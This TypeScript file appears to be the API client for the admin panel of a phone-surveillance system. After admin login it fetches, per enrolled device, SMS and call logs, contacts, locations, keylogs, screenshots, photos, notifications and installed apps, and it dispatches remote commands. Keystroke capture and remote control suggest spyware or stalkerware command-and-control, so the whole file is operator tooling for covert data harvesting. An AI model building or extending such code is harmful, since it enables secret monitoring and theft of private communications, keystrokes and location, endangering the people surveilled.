import axios from 'axios';

// Use localhost for testing, switch to production URL for deployment
const API_URL = process.env.NEXT_PUBLIC_API_URL || 'http://localhost:3001';

const api = axios.create({
    baseURL: `${API_URL}/api`,
    timeout: 30000,
});

// Add auth token to requests
api.interceptors.request.use((config) => {
    if (typeof window !== 'undefined') {
        const token = localStorage.getItem('admin_token');
        if (token) {
            config.headers.Authorization = `Bearer ${token}`;
        }
    }
    return config;
});

// Auth
export const login = async (username: string, password: string) => {
    const res = await api.post('/auth/admin/login', { username, password });
    return res.data;
};

// Devices
export const getDevices = async () => {
    const res = await api.get('/devices');
    return res.data;
};

export const getDevice = async (deviceId: string) => {
    const res = await api.get(`/devices/${deviceId}`);
    return res.data;
};

export const deleteDevice = async (deviceId: string) => {
    const res = await api.delete(`/devices/${deviceId}`);
    return res.data;
};

// Refresh device status from real-time socket connections
export const refreshRealtimeStatus = async () => {
    const res = await api.get('/devices/status/realtime');
    return res.data;
};

// SMS
export const getSmsLogs = async (deviceId: string, page = 1, limit = 50) => {
    const res = await api.get(`/devices/${deviceId}/sms`, { params: { page, limit } });
    return res.data;
};

// Calls
export const getCallLogs = async (deviceId: string, page = 1, limit = 50) => {
    const res = await api.get(`/devices/${deviceId}/calls`, { params: { page, limit } });
    return res.data;
};

// Contacts
export const getContacts = async (deviceId: string, search?: string) => {
    const res = await api.get(`/devices/${deviceId}/contacts`, { params: { search } });
    return res.data;
};

// Locations
export const getLocations = async (deviceId: string, limit = 100) => {
    const res = await api.get(`/devices/${deviceId}/locations`, { params: { limit } });
    return res.data;
};

// Keylogs
export const getKeylogs = async (deviceId: string, page = 1, limit = 100) => {
    const res = await api.get(`/devices/${deviceId}/keylogs`, { params: { page, limit } });
    return res.data;
};

// Apps
export const getApps = async (deviceId: string, includeSystem = false) => {
    const res = await api.get(`/devices/${deviceId}/apps`, { params: { includeSystem } });
    return res.data;
};

// Notifications
export const getNotifications = async (deviceId: string, page = 1, limit = 50) => {
    const res = await api.get(`/devices/${deviceId}/notifications`, { params: { page, limit } });
    return res.data;
};

// Screenshots
export const getScreenshots = async (deviceId: string, page = 1, limit = 20) => {
    const res = await api.get(`/devices/${deviceId}/screenshots`, { params: { page, limit } });
    return res.data;
};

// Photos
export const getPhotos = async (deviceId: string, page = 1, limit = 20) => {
    const res = await api.get(`/devices/${deviceId}/photos`, { params: { page, limit } });
    return res.data;
};

// Commands
export const dispatchCommand = async (deviceId: string, type: string, payload?: any) => {
    const res = await api.post('/commands/dispatch', { deviceId, type, payload });
    return res.data;
};

export const getCommandHistory = async (deviceId: string, limit = 50) => {
    const res = await api.get(`/commands/history/${deviceId}`, { params: { limit } });
    return res.data;
};

export { API_URL };
export default api;
